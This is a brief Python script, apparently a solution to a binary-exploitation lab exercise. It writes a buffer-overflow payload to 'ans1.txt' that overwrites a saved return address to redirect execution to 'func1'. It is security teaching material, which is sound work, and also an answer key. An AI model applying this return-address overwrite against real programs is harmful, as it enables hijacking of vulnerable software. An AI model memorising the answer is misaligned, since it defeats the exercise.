# 填充 16 个字节
padding = b'A' * 16

# func1 地址的低 3 字节（因为原返回地址高 5 字节已经是 0x0000000000）
# 原返回地址 0x401362 -> 62 13 40 00 00 00 00 00
# 改为 0x401216 -> 16 12 40 00 00 00 00 00
# 只覆盖低 3 字节：0x16, 0x12, 0x40
address = b'\x16\x12\x40'

# payload = 填充 + 地址低 3 字节 + 空字节（确保 strcpy 正常终止）
payload = padding + address + b'\x00'

# 写入文件
with open("ans1.txt", "wb") as f:
    f.write(payload)

print(f"Payload length: {len(payload)} bytes")
print("Payload written to ans1.txt")
print("Hex view:", payload.hex())